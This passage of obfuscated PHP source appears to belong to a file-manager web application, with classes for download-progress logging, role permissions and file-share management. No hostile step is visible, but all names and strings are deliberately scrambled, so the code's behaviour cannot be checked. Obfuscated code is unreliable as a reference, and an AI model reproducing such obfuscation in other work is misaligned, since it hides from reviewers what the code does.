case $™­ñ¦[652]: $„Ûô˜şÙ[$™­ñ¦[1830]] = $ßÅËÓ¡[$™­ñ¦[32]]; break; case $™­ñ¦[654]: $‡òÇ¤”î = intval($¬ à±¯[$™­ñ¦[467]] * 0.4); break; case $™­ñ¦[656]: $‡òÇ¤”î = intval($¬ à±¯[$™­ñ¦[467]] * 0.2); break; case $™­ñ¦[658]: $‡òÇ¤”î = intval($¬ à±¯[$™­ñ¦[467]] * 0.4); break; } $this->update($‡òÇ¤”î); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Òßåòòø, $¥Ì³¢À¦) { $ê©®¨Ê =& $_SERVER[¼èá¯æÙ]; $this->sourceModelCopyFlag = !0; $İ•ôö¶Ò = 1; if (isset($Òßåòòø[$ê©®¨Ê[92]])) { $İ•ôö¶Ò = $Òßåòòø[$ê©®¨Ê[92]][$ê©®¨Ê[90]]; $İ•ôö¶Ò = $İ•ôö¶Ò + $Òßåòòø[$ê©®¨Ê[92]][$ê©®¨Ê[91]] + 1; } $this->update($İ•ôö¶Ò); $this->sourceModelCopyFlag = !1; } public function sourceMove($¢Ëï  ¿) { $this->sourceRemove($¢Ëï  ¿, !1); } public function curlProgress($Ğ™œ…, $œÒÈîûË, $õÌª¼Ğ†, $£é¹ñÑû, $¶µÍÉÕ) { $ì€‚‰ëô =& $_SERVER[¼èá¯æÙ]; $ùÎæÏ¸‘ =& $this->task; if ($¶µÍÉÕ > 0) { $ùÎæÏ¸‘[$ì€‚‰ëô[1147]] = $ì€‚‰ëô[1852]; $ùÎæÏ¸‘[$ì€‚‰ëô[1834]] = $ì€‚‰ëô[120]; if ($ùÎæÏ¸‘[$ì€‚‰ëô[1832]]) { $ùÎæÏ¸‘[$ì€‚‰ëô[1833]] = $¶µÍÉÕ; } if ($ùÎæÏ¸‘[$ì€‚‰ëô[1835]]) { $ùÎæÏ¸‘[$ì€‚‰ëô[1833]] = $¶µÍÉÕ + $ùÎæÏ¸‘[$ì€‚‰ëô[1835]]; } } else { if ($õÌª¼Ğ† > 0) { if ($ùÎæÏ¸‘[$ì€‚‰ëô[1832]] == $œÒÈîûË) { $ùÎæÏ¸‘[$ì€‚‰ëô[1833]] = $õÌª¼Ğ†; $ùÎæÏ¸‘[$ì€‚‰ëô[1147]] = $ì€‚‰ëô[1853]; $ùÎæÏ¸‘[$ì€‚‰ëô[1834]] = $ì€‚‰ëô[1284]; } } } $this->update(); } public function curlProgressStart($ö¥Ù‘¬š) { } public function curlProgressEnd($»¼ÄÖ¨¹) { $ªÉ¢¥ç =& $_SERVER[¼èá¯æÙ]; $ıÅÀ¸§‡ =& $this->task; $Ï¯êÊšÁ = curl_getinfo($»¼ÄÖ¨¹); $ì§ÄÎ¢ = $Ï¯êÊšÁ[$ªÉ¢¥ç[1854]]; if ($ì§ÄÎ¢ == -1) { $ì§ÄÎ¢ = $Ï¯êÊšÁ[$ªÉ¢¥ç[1855]]; } if ($ıÅÀ¸§‡[$ªÉ¢¥ç[1834]] == $ªÉ¢¥ç[120] && $ì§ÄÎ¢) { $ıÅÀ¸§‡[$ªÉ¢¥ç[1835]] += $ì§ÄÎ¢; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $‹ó½†»á =& $_SERVER[¼èá¯æÙ]; $ã‚«†¡ª =& $this->task; $ã‚«†¡ª[$‹ó½†»á[1856]] = 1; Hook::bind($‹ó½†»á[1824], array($this, $‹ó½†»á[1857])); Hook::bind($‹ó½†»á[1826], array($this, $‹ó½†»á[1858])); Hook::bind($‹ó½†»á[1828], array($this, $‹ó½†»á[1859])); } protected function endAfter() { $Å×«³Ú =& $_SERVER[¼èá¯æÙ]; Hook::unbind($Å×«³Ú[1824], array($this, $Å×«³Ú[1857])); Hook::unbind($Å×«³Ú[1826], array($this, $Å×«³Ú[1858])); Hook::unbind($Å×«³Ú[1828], array($this, $Å×«³Ú[1859])); } public function progressStart($½ğ¡Ó–) { $•öÏæŞ§ =& $_SERVER[¼èá¯æÙ]; $öƒô‚áõ = curl_getinfo($½ğ¡Ó–); self::log($•öÏæŞ§[1860] . $öƒô‚áõ[$•öÏæŞ§[394]]); self::valueSet($this->task[$•öÏæŞ§[486]], $this->task); } public function progressEnd($¬×Åë¶ì) { $İñ—õ‰œ =& $_SERVER[¼èá¯æÙ]; self::log($İñ—õ‰œ[1861] . $this->task[$İñ—õ‰œ[486]]); $this->end(); } public function progress($ıÙ•Ÿäº, $Œö‹œšÈ, $Öç¸òƒ¼, $ûî‹ñÁû, $œíÉ°¿®) { $úá‹êàù =& $_SERVER[¼èá¯æÙ]; $‰×”ğ‹Â =& $this->task; if ($œíÉ°¿® > 0) { $‰×”ğ‹Â[$úá‹êàù[1145]] = $‰×”ğ‹Â[$úá‹êàù[1145]] == 0 ? $ûî‹ñÁû : $‰×”ğ‹Â[$úá‹êàù[1145]]; $‰×”ğ‹Â[$úá‹êàù[1779]] = $œíÉ°¿®; } else { if ($Öç¸òƒ¼ > 0) { $‰×”ğ‹Â[$úá‹êàù[1145]] = $‰×”ğ‹Â[$úá‹êàù[1145]] == 0 ? $Œö‹œšÈ : $‰×”ğ‹Â[$úá‹êàù[1145]]; $‰×”ğ‹Â[$úá‹êàù[1779]] = $Öç¸òƒ¼; } } $this->update(); self::log("\160\x72\157\x67\162\145\163\163\110\164\164\x70\72\144\157\x77\156\72{$Öç¸òƒ¼}\x2f{$Œö‹œšÈ}\73\40\x75\160\x6c\157\141\144\x3a{$œíÉ°¿®}\57{$ûî‹ñÁû}\x3b"); } } goto EˆÄâËææÔ; bß­œïµÙ«: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\x6d\x5f\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\155\145\x6e\x75", "\x72\157\154\145", "\x72\157\154\x65\x47\162\x6f\165\160", "\x72\x65\x67\151\x73\x74", "\145\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($¢ÈİºÊ) { return "\123\171\x73\164\x65\x6d\x4f\x70\x74\151\x6f\156\x5f{$¢ÈİºÊ}"; } protected function optionDefault($«ô•Èú = '') { $êã°ü¼± =& $_SERVER[¼èá¯æÙ]; if ($«ô•Èú == $êã°ü¼±[12]) { return $GLOBALS[$êã°ü¼±[6]][$êã°ü¼±[468]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\162\157\x6c\145\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\x61\x75\x74\150", "\154\x61\142\145\154", "\x64\x69\x73\x70\154\x61\x79", "\x73\x79\163\x74\x65\x6d", "\144\145\x73\143", "\151\147\156\157\x72\145\x45\x78\x74", "\151\147\156\157\x72\x65\106\x69\x6c\145\x53\x69\x7a\x65", "\x61\x64\155\x69\156\x69\x73\164\162\x61\164\x6f\x72", "\163\157\x72\164"); public function listData($ó´Ğš§ª = false, $ö€ØŞİµ = "\163\x6f\x72\164", $¥¨—ËŸŞ = false) { $âŠ¼‹Ş÷ =& $_SERVER[¼èá¯æÙ]; $Ä²¦ÖŸŸ = parent::listData($ó´Ğš§ª, $ö€ØŞİµ, $¥¨—ËŸŞ); if (!$ó´Ğš§ª) { foreach ($Ä²¦ÖŸŸ as $ßã‹šÁÓ => $¾Ú‰ª‰) { if ($¾Ú‰ª‰[$âŠ¼‹Ş÷[2190]] == 1) { $Ä²¦ÖŸŸ[$ßã‹šÁÓ][$âŠ¼‹Ş÷[537]] = LNG($âŠ¼‹Ş÷[2459]); } } } return $Ä²¦ÖŸŸ; } public function update($­Ú²‚Î¦, $Í¥Š•Ÿº) { $½ö°†æÁ =& $_SERVER[¼èá¯æÙ]; $íÆŞÃô¶ = parent::listData($­Ú²‚Î¦); $«ÅØîñ = $this->findByName($Í¥Š•Ÿº[$½ö°†æÁ[32]]); if (!$íÆŞÃô¶ || $«ÅØîñ && $«ÅØîñ[$½ö°†æÁ[486]] != $íÆŞÃô¶[$½ö°†æÁ[486]]) { return !1; } if ($«ÅØîñ[$½ö°†æÁ[2190]] == 1) { $Í¥Š•Ÿº = array($½ö°†æÁ[32] => $Í¥Š•Ÿº[$½ö°†æÁ[32]], $½ö°†æÁ[2002] => $Í¥Š•Ÿº[$½ö°†æÁ[2002]]); } $this->filterAuth($Í¥Š•Ÿº[$½ö°†æÁ[498]]); return parent::update($­Ú²‚Î¦, $Í¥Š•Ÿº); } public function remove($·ÎˆØ™“) { $Ô¿éÓèË = parent::listData($·ÎˆØ™“); if (!$Ô¿éÓèË || $Ô¿éÓèË[$_SERVER[¼èá¯æÙ][201]]) { return !1; } return parent::remove($·ÎˆØ™“); } public function add($¹šüôÈö) { $›È±”Ö‰ =& $_SERVER[¼èá¯æÙ]; $©–õšµ = $¹šüôÈö[$›È±”Ö‰[32]]; if ($this->findByName($©–õšµ)) { return !1; } $‰õõü¼‚ = array($›È±”Ö‰[505] => $©–õšµ, $›È±”Ö‰[1985] => $›È±”Ö‰[12], $›È±”Ö‰[1981] => $›È±”Ö‰[1989], $›È±”Ö‰[2460] => 1, $›È±”Ö‰[1984] => 0, $›È±”Ö‰[2461] => 0, $›È±”Ö‰[1983] => $this->getSort()); $¹šüôÈö = array_merge($‰õõü¼‚, $¹šüôÈö); $this->filterAuth($¹šüôÈö[$›È±”Ö‰[498]]); return parent::insert($¹šüôÈö); } private function getSort() { $Øº³ê¾ˆ =& $_SERVER[¼èá¯æÙ]; $Å‚¡Ì¼× = parent::listData(); $²ÁÚ•Ëî = array_to_keyvalue($Å‚¡Ì¼×, $Øº³ê¾ˆ[12], $Øº³ê¾ˆ[2003]); return empty($²ÁÚ•Ëî) ? 0 : max($²ÁÚ•Ëî) + 1; } private function filterAuth(&$îáœÍ³Ã) { $ÔÑ”É–ó =& $_SERVER[¼èá¯æÙ]; $ƒì¶…Êı = array(); $óûå˜¿» = array_filter(explode($ÔÑ”É–ó[50], $îáœÍ³Ã)); foreach ($óûå˜¿» as $îáœÍ³Ã) { $êµù€õå = explode($ÔÑ”É–ó[10], $îáœÍ³Ã); if ($êµù€õå[0] == $ÔÑ”É–ó[2462] && $êµù€õå[1] != $ÔÑ”É–ó[1280]) { $áŠÎ¥èŞ = $êµù€õå[0] . $ÔÑ”É–ó[10] . $êµù€õå[1] . $ÔÑ”É–ó[2463]; if (!in_array($áŠÎ¥èŞ, $óûå˜¿»)) { $ƒì¶…Êı[] = $áŠÎ¥èŞ; } } $ƒì¶…Êı[] = $îáœÍ³Ã; } $îáœÍ³Ã = implode($ÔÑ”É–ó[50], $ƒì¶…Êı); } public function findRoleDefault() { $’ƒŞ  ô =& $_SERVER[¼èá¯æÙ]; $¶ŞºÛé = parent::listData(); $Ô†ùÅïª = !1; foreach ($¶ŞºÛé as $ùŒÉãÓ) { if (!$ùŒÉãÓ || $ùŒÉãÓ[$’ƒŞ  ô[2001]] == $’ƒŞ  ô[240] || $ùŒÉãÓ[$’ƒŞ  ô[2190]] == 1) { continue; } if (strstr($ùŒÉãÓ[$’ƒŞ  ô[498]], $’ƒŞ  ô[2464])) { continue; } if (!strstr($ùŒÉãÓ[$’ƒŞ  ô[498]], $’ƒŞ  ô[2465])) { continue; } if (!$Ô†ùÅïª) { $Ô†ùÅïª = $ùŒÉãÓ; continue; } $‰÷•äŞ¯ = explode($’ƒŞ  ô[50], $Ô†ùÅïª[$’ƒŞ  ô[498]]); $´µ›Ü‚Ü = explode($’ƒŞ  ô[50], $ùŒÉãÓ[$’ƒŞ  ô[498]]); if (count($‰÷•äŞ¯) > count($´µ›Ü‚Ü)) { $Ô†ùÅïª = $ùŒÉãÓ; } } return $Ô†ùÅïª ? $Ô†ùÅïª[$’ƒŞ  ô[486]] : $’ƒŞ  ô[12]; } public function sort($÷’Î˜úÛ, $»‹šåŸö) { return parent::update($÷’Î˜úÛ, $»‹šåŸö); } } goto eº›ªÀŞø¤; f¤½ÃÍÀ‘: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\171\124\x69\155\145", "\x74\151\x6d\x65", "\x69\x6e\x73\145\x72\164\x2c\165\160\x64\x61\x74\x65", "\146\165\156\143\x74\x69\157\156"), array("\x63\162\x65\x61\164\x65\x54\x69\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\x73\x65\162\164", "\146\165\156\x63\x74\x69\x6f\156"), array("\x6f\x70\164\151\x6f\x6e\163", '', "\x69\x6e\x73\x65\162\164\x2c\x75\x70\x64\x61\x74\x65\54\x73\x65\x6c\x65\x63\x74", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($›ˆÜ) { $áı‚ñ©… =& $_SERVER[¼èá¯æÙ]; $äçİæ¯à = isset($›ˆÜ[0]) ? $›ˆÜ[0] : !1; $ÙÒ«íØî = $áı‚ñ©…[2122] . USER_ID; return array($áı‚ñ©…[2123] => array(USER_ID, $áı‚ñ©…[2124]), $áı‚ñ©…[2063] => array($äçİæ¯à, $áı‚ñ©…[2125], $ÙÒ«íØî)); } protected function listSimple() { $§É”’’« = array($_SERVER[¼èá¯æÙ][1778] => USER_ID); $û³ÒÂ§í = $this->field($this->fieldList)->where($§É”’’«)->select(); return $û³ÒÂ§í ? $û³ÒÂ§í : array(); } protected function getInfo($ìÃºßëÒ, $äÀ¾û¹ = false, $ËÆÕş = '') { $€ú›ÈãŒ =& $_SERVER[¼èá¯æÙ]; if (!$ËÆÕş) { $ËÆÕş = $€ú›ÈãŒ[2122] . USER_ID; } if ($äÀ¾û¹) { return $this->_getShareInfo(array($€ú›ÈãŒ[679] => $ìÃºßëÒ)); } $Şéª­ = $this->cacheFunctionGet($€ú›ÈãŒ[2065], $ìÃºßëÒ, $ËÆÕş); $’ÃİŒ¦§ = $this->shareInfoMofify($Şéª­, $€ú›ÈãŒ[235]); if (isset($Şéª­[$€ú›ÈãŒ[98]]) && $’ÃİŒ¦§ != $Şéª­[$€ú›ÈãŒ[98]]) { $µªôÊÀ¾ = $this->cacheKeyMake($€ú›ÈãŒ[2065], $ìÃºßëÒ, $ËÆÕş); $Şéª­ = $this->_getShareInfo(array($€ú›ÈãŒ[679] => $ìÃºßëÒ)); Cache::set($µªôÊÀ¾, $Şéª­); } return $Şéª­; } private function shareInfoMofify(&$£—²—Ù”, $Ã€Œôâ = "\147\145\164") { $şÃÀ‰´­ =& $_SERVER[¼èá¯æÙ]; if (!$£—²—Ù” || !isset($£—²—Ù”[$şÃÀ‰´­[679]])) { return; } $ÁÍ‰ÚÏ˜ = $şÃÀ‰´­[2126] . $£—²—Ù”[$şÃÀ‰´­[679]]; if ($Ã€Œôâ == $şÃÀ‰´­[235]) { return Cache::get($ÁÍ‰ÚÏ˜); } else { if ($Ã€Œôâ == $şÃÀ‰´­[2093]) { $®¢ã’Ä„ = Cache::get($ÁÍ‰ÚÏ˜); if ($®¢ã’Ä„ === $£—²—Ù”[$şÃÀ‰´­[98]]) { return; } $£—²—Ù”[$şÃÀ‰´­[2127]] = USER_ID . $şÃÀ‰´­[473] . $£—²—Ù”[$şÃÀ‰´­[98]]; Cache::set($ÁÍ‰ÚÏ˜, $£—²—Ù”[$şÃÀ‰´­[98]]); } else { if ($Ã€Œôâ == $şÃÀ‰´­[2128]) { Cache::remove($ÁÍ‰ÚÏ˜); } } } } public function getInfoByHash($à“‚óä›) { return $this->_getShareInfo(array($_SERVER[¼èá¯æÙ][2129] => $à“‚óä›)); } public function getInfoByPath($­»êÇƒ–) { $˜ş°Ş¹¬ =& $_SERVER[¼èá¯æÙ]; $ö”ˆùÏ¿ = array($˜ş°Ş¹¬[1778] => USER_ID, $˜ş°Ş¹¬[203] => $­»êÇƒ–); return $this->_getShareInfo($ö”ˆùÏ¿); } public function getInfoBySourcePath($İŸö´à°) { $Í‘‡Á© =& $_SERVER[¼èá¯æÙ]; $õ€ëÜË = array($Í‘‡Á©[1778] => USER_ID, $Í‘‡Á©[1262] => $İŸö´à°); return $this->_getShareInfo($õ€ëÜË); } private function _getShareInfo($ «‚Ğ“§) { $¨Šò¦» =& $_SERVER[¼èá¯æÙ]; $ß¡­‰ÙÊ = $this->where($ «‚Ğ“§)->find(); if (!$ß¡­‰ÙÊ) { return !1; } $ «‚Ğ“§ = array($¨Šò¦»[679] => $ß¡­‰ÙÊ[$¨Šò¦»[679]]); $¨¯áœÍ¿ = $¨Šò¦»[2130]; $ªç¨å¶Ä = Model($¨Šò¦»[680])->order($¨Šò¦»[486])->field($¨¯áœÍ¿)->where($ «‚Ğ“§)->select(); if ($ß¡­‰ÙÊ[$¨Šò¦»[203]] == $¨Šò¦»[240]) { $ß¡­‰ÙÊ[$¨Šò¦»[100]] = IO::info($ß¡­‰ÙÊ[$¨Šò¦»[1262]]); } else { $ß¡­‰ÙÊ[$¨Šò¦»[100]] = Model($¨Šò¦»[1426])->pathInfo($ß¡­‰ÙÊ[$¨Šò¦»[203]]); } $ß¡­‰ÙÊ[$¨Šò¦»[2131]] = $ªç¨å¶Ä; $this->shareInfoMofify($ß¡­‰ÙÊ, $¨Šò¦»[2093]); return $ß¡­‰ÙÊ; } protected function getInfoAuth($€ò¹Å) { $¿šõÙË =& $_SERVER[¼èá¯æÙ]; $óÆ¢ÏÛˆ = $this->getInfo($€ò¹Å); if ($óÆ¢ÏÛˆ[$¿šõÙË[1778]] == USER_ID) { $óÆ¢ÏÛˆ[$¿šõÙË[498]] = $óÆ¢ÏÛˆ[$¿šõÙË[100]][$¿šõÙË[498]]; } else { $óÆ¢ÏÛˆ[$¿šõÙË[498]] = Model($¿šõÙË[578])->authMake($óÆ¢ÏÛˆ[$¿šõÙË[2131]]); } return $óÆ¢ÏÛˆ; } protected function listData($ú®«»µë = null, $ËŒ¼ÑÈÇ = 300) { $­‰—ëÙ‘ =& $_SERVER[¼èá¯æÙ]; $¿å¨­äÅ = array(array($­‰—ëÙ‘[573] => array($­‰—ëÙ‘[1094], 0), $­‰—ëÙ‘[677] => array($­‰—ëÙ‘[1094], 0), $­‰—ëÙ‘[2132] => $­‰—ëÙ‘[2081])); if ($ú®«»µë == $­‰—ëÙ‘[2133]) { $¿å¨­äÅ = array($­‰—ëÙ‘[573] => 1); } else { if ($ú®«»µë == $­‰—ëÙ‘[1247]) { $¿å¨­äÅ = array($­‰—ëÙ‘[677] => 1); } } $¿å¨­äÅ[$­‰—ëÙ‘[1778]] = USER_ID; $şš›¼µÅ = $this->where($¿å¨­äÅ)->selectPage($ËŒ¼ÑÈÇ); return $şš›¼µÅ; } protected function listToMe($¶×¸¿¨ = 300) { $“Æ¹ÊşÒ =& $_SERVER[¼èá¯æÙ]; $îíŞÃ•ù = Model($“Æ¹ÊşÒ[2134])->userGroupParents(USER_ID); $¥¬‘–ÙÇ = array($“Æ¹ÊşÒ[662] => SourceModel::TYPE_USER, $“Æ¹ÊşÒ[580] => USER_ID); if ($îíŞÃ•ù) { $¥¬‘–ÙÇ = array(array($“Æ¹ÊşÒ[662] => SourceModel::TYPE_USER, $“Æ¹ÊşÒ[580] => USER_ID), array($“Æ¹ÊşÒ[662] => SourceModel::TYPE_GROUP, $“Æ¹ÊşÒ[580] => array($“Æ¹ÊşÒ[7], $îíŞÃ•ù)), $“Æ¹ÊşÒ[2132] => $“Æ¹ÊşÒ[2081]); } $ı€ª‚‰ü = Model($“Æ¹ÊşÒ[680])->where($¥¬‘–ÙÇ)->selectPage($¶×¸¿¨); $ëÒ‰Óé… = array_to_keyvalue_group($ı€ª‚‰ü[$“Æ¹ÊşÒ[457]], $“Æ¹ÊşÒ[679]); if (!$ëÒ‰Óé…) { return $ı€ª‚‰ü; } $¨»µº³È = $“Æ¹ÊşÒ[2135]; $¥¬‘–ÙÇ = array($“Æ¹ÊşÒ[679] => array($“Æ¹ÊşÒ[503], array_keys($ëÒ‰Óé…)), $“Æ¹ÊşÒ[1778] => array($“Æ¹ÊşÒ[1096], $“Æ¹ÊşÒ[240])); $¸Ùí˜˜ = $this->field($¨»µº³È)->where($¥¬‘–ÙÇ)->select(); foreach ($¸Ùí˜˜ as $ÂÛšõ¤ => &$‰ÕÎœÅ¼) { $‰ÕÎœÅ¼[$“Æ¹ÊşÒ[2131]] = $ëÒ‰Óé…[$‰ÕÎœÅ¼[$“Æ¹ÊşÒ[679]]]; } unset($‰ÕÎœÅ¼); $šèƒáÃ = array($“Æ¹ÊşÒ[2136] => $¸Ùí˜˜, $“Æ¹ÊşÒ[2137] => $ı€ª‚‰ü[$“Æ¹ÊşÒ[454]]); return $šèƒáÃ; } protected function shareAdd($é³¥åø , $³àä°­å) { $á•Äù˜± =& $_SERVER[¼èá¯æÙ]; $Áı®ŞÛü = $this->_addShareData($é³¥åø , $³àä°­å); if (!empty($³àä°­å[$á•Äù˜±[2138]])) { $this->_shareAuthSet($Áı®ŞÛü, $³àä°­å[$á•Äù˜±[2138]]); } $this->shareEventAdd($é³¥åø , $³àä°­å, $á•Äù˜±[2139]); return $Áı®ŞÛü; } protected function shareAddSystem($‹Ğ…«Ğ, $·ô¥æ€) { $ú®±§Ş¯ =& $_SERVER[¼èá¯æÙ]; $–…ƒ·ü› = $this->_addShareData($‹Ğ…«Ğ, $·ô¥æ€, $ú®±§Ş¯[201]); $this->_shareAuthSet($–…ƒ·ü›, $·ô¥æ€[$ú®±§Ş¯[2138]]); return $–…ƒ·ü›; } private function shareEventAdd($×Ÿ›ÅÇÑ, $Òøç„“, $´·™¡Ë = "\x61\x64\x64") { $­úºˆ•ğ =& $_SERVER[¼èá¯æÙ]; if (!$×Ÿ›ÅÇÑ || $×Ÿ›ÅÇÑ == $­úºˆ•ğ[240]) { return; } if ($´·™¡Ë == $­úºˆ•ğ[2139]) { if ($Òøç„“[$­úºˆ•ğ[573]] == $­úºˆ•ğ[101]) { Model($­úºˆ•ğ[647])->eventShare($×Ÿ›ÅÇÑ, $­úºˆ•ğ[2140]); } if ($Òøç„“[$­úºˆ•ğ[677]] == $­úºˆ•ğ[101]) { Model($­úºˆ•ğ[647])->eventShare($×Ÿ›ÅÇÑ, $­úºˆ•ğ[2141]); } return; } $ÓÆˆ¸è® = $this->getInfoByPath($×Ÿ›ÅÇÑ); $·¿ óî = $­úºˆ•ğ[2142]; if ($ÓÆˆ¸è®[$­úºˆ•ğ[573]] == $­úºˆ•ğ[240] && $Òøç„“[$­úºˆ•ğ[573]] == $­úºˆ•ğ[101]) { $·¿ óî = $­úºˆ•ğ[2140]; } if ($ÓÆˆ¸è®[$­úºˆ•ğ[573]] == $­úºˆ•ğ[101] && $Òøç„“[$­úºˆ•ğ[573]] == $­úºˆ•ğ[240]) { $·¿ óî = $­úºˆ•ğ[2143]; } if ($ÓÆˆ¸è®[$­úºˆ•ğ[677]] == $­úºˆ•ğ[240] && $Òøç„“[$­úºˆ•ğ[677]] == $­úºˆ•ğ[101]) { $·¿ óî = $­úºˆ•ğ[2141]; } if ($ÓÆˆ¸è®[$­úºˆ•ğ[677]] == $­úºˆ•ğ[101] && $Òøç„“[$­úºˆ•ğ[677]] == $­úºˆ•ğ[240]) { $·¿ óî = $­úºˆ•ğ[2144]; } Model($­úºˆ•ğ[647])->eventShare($×Ÿ›ÅÇÑ, $·¿ óî); return; } private function _addShareData($õ•ıøªâ, $Ë¾ö„ğ = array(), $á…©«¼ƒ = false) { $œŞ¾ç®È =& $_SERVER[¼èá¯æÙ]; $„øÙÆš£ = $á…©«¼ƒ == $œŞ¾ç®È[201] ? 0 : USER_ID; $µ†ÕÖ§Ü = array($œŞ¾ç®È[502] => $õ•ıøªâ, $œŞ¾ç®È[1769] => $„øÙÆš£); if ($õ•ıøªâ == 0) { $µ†ÕÖ§Ü = array($œŞ¾ç®È[2145] => $Ë¾ö„ğ[$œŞ¾ç®È[1262]], $œŞ¾ç®È[1769] => $„øÙÆš£); } if ($•°£™æÙ = $this->where($µ†ÕÖ§Ü)->find()) { return $•°£™æÙ[$œŞ¾ç®È[679]]; } if ($õ•ıøªâ == 0) { $©ÖËöú = array($œŞ¾ç®È[32] => get_path_this($Ë¾ö„ğ[$œŞ¾ç®È[97]])); } else { $©ÖËöú = Model($œŞ¾ç®È[907])->sourceInfo($õ•ıøªâ); if (!$©ÖËöú) { return !1; } } if (!$Ë¾ö„ğ[$œŞ¾ç®È[1666]]) { $Ë¾ö„ğ[$œŞ¾ç®È[1666]] = $©ÖËöú[$œŞ¾ç®È[32]]; } $±İ¶á²Ç = array($œŞ¾ç®È[1769] => $„øÙÆš£, $œŞ¾ç®È[502] => $õ•ıøªâ, $œŞ¾ç®È[1666] => $œŞ¾ç®È[12], $œŞ¾ç®È[573] => 0, $œŞ¾ç®È[677] => 0, $œŞ¾ç®È[1262] => $œŞ¾ç®È[12], $œŞ¾ç®È[394] => $œŞ¾ç®È[12], $œŞ¾ç®È[971] => $œŞ¾ç®È[12], $œŞ¾ç®È[2146] => 0, $œŞ¾ç®È[2147] => 0, $œŞ¾ç®È[843] => 0, $œŞ¾ç®È[2148] => $œŞ¾ç®È[12], $œŞ¾ç®È[2129] => $œŞ¾ç®È[12]); $©ÈˆÎç = explode($œŞ¾ç®È[50], $œŞ¾ç®È[2149]); foreach ($©ÈˆÎç as $šÔŒé¢ë) { if (!isset($Ë¾ö„ğ[$šÔŒé¢ë])) { continue; } $±İ¶á²Ç[$šÔŒé¢ë] = $Ë¾ö„ğ[$šÔŒé¢ë]; } $§¯£áÂË = $this->add($±İ¶á²Ç); $åàçıÍû = array($œŞ¾ç®È[2129] => short_id($§¯£áÂË)); $this->where(array($œŞ¾ç®È[2150] => $§¯£áÂË))->save($åàçıÍû); return $§¯£áÂË; } private function _shareAuthSet($ÙÊ ¨­¨, $Ùô’ò©) { $”Ñ”º§÷ =& $_SERVER[¼èá¯æÙ]; if (!is_array($Ùô’ò©)) { return !1; } $àòíøøƒ = Model($”Ñ”º§÷[2091]); $àòíøøƒ->where(array($”Ñ”º§÷[679] => $ÙÊ ¨­¨))->delete(); $ú¶œÀœ© = array(); foreach ($Ùô’ò© as $–ä…ò©Ã) { $Õ˜Î¿‹ = SourceModel::TYPE_USER; if ($–ä…ò©Ã[$”Ñ”º§÷[200]] == SourceModel::TYPE_GROUP) { $Õ˜Î¿‹ = SourceModel::TYPE_GROUP; } $„­ÄÀë™ = array($”Ñ”º§÷[679] => $ÙÊ ¨­¨, $”Ñ”º§÷[200] => $Õ˜Î¿‹, $”Ñ”º§÷[580] => intval($–ä…ò©Ã[$”Ñ”º§÷[580]]), $”Ñ”º§÷[2087] => 0, $”Ñ”º§÷[2151] => -1); if ($–ä…ò©Ã[$”Ñ”º§÷[2087]]) { $„­ÄÀë™[$”Ñ”º§÷[2087]] = $–ä…ò©Ã[$”Ñ”º§÷[2087]]; } else { if ($–ä…ò©Ã[$”Ñ”º§÷[2151]]) { $„­ÄÀë™[$”Ñ”º§÷[2151]] = $–ä…ò©Ã[$”Ñ”º§÷[2151]]; } } $ú¶œÀœ©[] = $„­ÄÀë™; } return $àòíøøƒ->addAll($ú¶œÀœ©, array(), !0); } public function numViewAdd($„ƒì±õı) { $ç¥Ñß¾§ =& $_SERVER[¼èá¯æÙ]; $ôƒ÷É ” = array($ç¥Ñß¾§[2150] => $„ƒì±õı); $this->where($ôƒ÷É ”)->setAdd($ç¥Ñß¾§[2146]); } public function numDownloadAdd($»ÅÆÌ‰¨) { $Œæ’û =& $_SERVER[¼èá¯æÙ]; $³Ş–Õ¼© = array($Œæ’û[2150] => $»ÅÆÌ‰¨); $this->where($³Ş–Õ¼©)->setAdd($Œæ’û[2147]); } protected function shareEdit($òñ­˜šÑ, $Ñ¶û‹µö) { $ĞõÛÉ†ò =& $_SERVER[¼èá¯æÙ]; $ûáèÂ²Â = $this->getInfo($òñ­˜šÑ); if (!$ûáèÂ²Â) { return !1; } $this->_checkLinkShare($Ñ¶û‹µö, $ûáèÂ²Â); $—Óôˆõé = array(); $Ú×“áù = explode($ĞõÛÉ†ò[50], $ĞõÛÉ†ò[2152]); foreach ($Ú×“áù as $‰ã›„Â») { if (!array_key_exists($‰ã›„Â», $Ñ¶û‹µö)) { continue; } $—Óôˆõé[$‰ã›„Â»] = $Ñ¶û‹µö[$‰ã›„Â»]; } $this->shareEventAdd($ûáèÂ²Â[$ĞõÛÉ†ò[203]], $Ñ¶û‹µö, $ĞõÛÉ†ò[1948]); $this->where(array($ĞõÛÉ†ò[2150] => $òñ­˜šÑ))->save($—Óôˆõé); if (isset($Ñ¶û‹µö[$ĞõÛÉ†ò[2138]])) { $this->_shareAuthSet($òñ­˜šÑ, $Ñ¶û‹µö[$ĞõÛÉ†ò[2138]]); } return !0; } private function _checkLinkShare($ÖçåÜ–×, $ûñáÅï˜) { $Şäî®³Ì =& $_SERVER[¼èá¯æÙ]; if ($ÖçåÜ–×[$Şäî®³Ì[573]] != $Şäî®³Ì[101]) { return; } $Ó¾‘¸ìˆ = $ûñáÅï˜[$Şäî®³Ì[100]][$Şäî®³Ì[203]]; if ($ûñáÅï˜[$Şäî®³Ì[100]][$Şäî®³Ì[33]] != $Şäî®³Ì[242]) { $Îë¸ç¿¡ = $this->_folderReport($Ó¾‘¸ìˆ); if (!$Îë¸ç¿¡) { return; } show_json(LNG($Şäî®³Ì[2153]) . $Şäî®³Ì[2154] . $Îë¸ç¿¡, !1); } $âóÔ§ùù = Model($Şäî®³Ì[907])->fileInfoGet($ûñáÅï˜[$Şäî®³Ì[100]][$Şäî®³Ì[203]]); if (!$âóÔ§ùù) { return; } $„”•ĞşÜ = $this->shareFileMeta($âóÔ§ùù[$Şäî®³Ì[552]]); if (isset($„”•ĞşÜ[$Şäî®³Ì[462]]) && $„”•ĞşÜ[$Şäî®³Ì[462]] == $Şäî®³Ì[101]) { show_json(LNG($Şäî®³Ì[2155]), 